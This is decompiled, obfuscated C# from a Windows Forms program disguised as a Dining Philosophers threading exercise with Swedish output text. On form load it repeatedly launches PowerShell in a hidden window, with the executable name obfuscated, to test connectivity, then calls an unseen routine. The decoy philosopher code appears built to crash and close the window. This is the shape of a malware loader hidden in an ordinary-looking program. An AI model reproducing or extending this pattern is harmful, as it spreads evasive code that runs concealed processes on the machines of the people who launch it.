using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace Kvpbvpfa;

public sealed class i : Form
{
	private IContainer m_a;

	private TreeView m_b;

	private TreeView m_c;

	private TreeView d;

	private TreeView e;

	private TreeView f;

	private TreeView g;

	private TreeView h;

	private TreeView m_i;

	public i()
	{
		c();
	}

	private void a(object sender, EventArgs e)
	{
		try
		{
			for (int num = 0; num < 25; num++)
			{
				a();
				b();
			}
			h obj = new h(new bool[5], 5);
			obj.a();
			bool[] array = new bool[5];
			obj.c();
			h[] array2 = new h[5];
			for (int num2 = 0; num2 < array2.Length; num2++)
			{
				h h2 = new h(array, num2);
				Thread.Sleep(1000);
				Console.WriteLine(array2[num2].b());
				array2[num2] = h2;
				Thread thread = new Thread(h2.d);
				thread.Name = num2.ToString();
				thread.Start();
			}
			char[] array3 = new char[array2.Length];
			while (true)
			{
				for (int num3 = 0; num3 < array2.Length; num3++)
				{
					array3[num3] = array2[num3].a();
				}
				Console.WriteLine("{0} {1} {2} {3} {4}", array3[0], array3[1], array3[2], array3[3], array3[4]);
				if (Console.KeyAvailable)
				{
					Console.WriteLine("Antal måltider:");
					for (int num4 = 0; num4 < array2.Length; num4++)
					{
						Console.WriteLine("Filosof {0}: {1}", array2[num4].b(), array2[num4].a());
					}
				}
				Thread.Sleep(1000);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			((Form)this).Close();
		}
	}

	private void a()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "p%ow%er%sh%el%l".Replace("%", ""),
			Arguments = "Test-Connection www.google.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	private void b()
	{
		l.a();
		Thread.Sleep(1000);
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		((Form)this).Dispose(a);
	}

	private void c()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		this.m_b = new TreeView();
		this.m_c = new TreeView();
		d = new TreeView();
		e = new TreeView();
		f = new TreeView();
		g = new TreeView();
		h = new TreeView();
		m_i = new TreeView();
		((Control)this).SuspendLayout();
		((Control)this.m_b).set_Location(new Point(0, 0));
		((Control)this.m_b).set_Name("treeView1");
		((Control)this.m_b).set_Size(new Size(121, 97));
		((Control)this.m_b).set_TabIndex(0);
		((Control)this.m_c).set_Location(new Point(312, 12));
		((Control)this.m_c).set_Name("treeView2");
		((Control)this.m_c).set_Size(new Size(121, 97));
		((Control)this.m_c).set_TabIndex(1);
		((Control)d).set_Location(new Point(-11, 136));
		((Control)d).set_Name("treeView3");
		((Control)d).set_Size(new Size(121, 97));
		((Control)d).set_TabIndex(2);
		((Control)e).set_Location(new Point(159, 205));
		((Control)e).set_Name("treeView4");
		((Control)e).set_Size(new Size(121, 97));
		((Control)e).set_TabIndex(3);
		((Control)f).set_Location(new Point(251, 342));
		((Control)f).set_Name("treeView5");
		((Control)f).set_Size(new Size(121, 97));
		((Control)f).set_TabIndex(4);
		((Control)g).set_Location(new Point(159, 32));
		((Control)g).set_Name("treeView6");
		((Control)g).set_Size(new Size(121, 97));
		((Control)g).set_TabIndex(5);
		((Control)h).set_Location(new Point(56, 276));
		((Control)h).set_Name("treeView7");
		((Control)h).set_Size(new Size(121, 97));
		((Control)h).set_TabIndex(6);
		((Control)m_i).set_Location(new Point(286, 136));
		((Control)m_i).set_Name("treeView8");
		((Control)m_i).set_Size(new Size(121, 97));
		((Control)m_i).set_TabIndex(7);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(445, 574));
		((Control)this).get_Controls().Add((Control)(object)m_i);
		((Control)this).get_Controls().Add((Control)(object)h);
		((Control)this).get_Controls().Add((Control)(object)g);
		((Control)this).get_Controls().Add((Control)(object)f);
		((Control)this).get_Controls().Add((Control)(object)e);
		((Control)this).get_Controls().Add((Control)(object)d);
		((Control)this).get_Controls().Add((Control)(object)this.m_c);
		((Control)this).get_Controls().Add((Control)(object)this.m_b);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
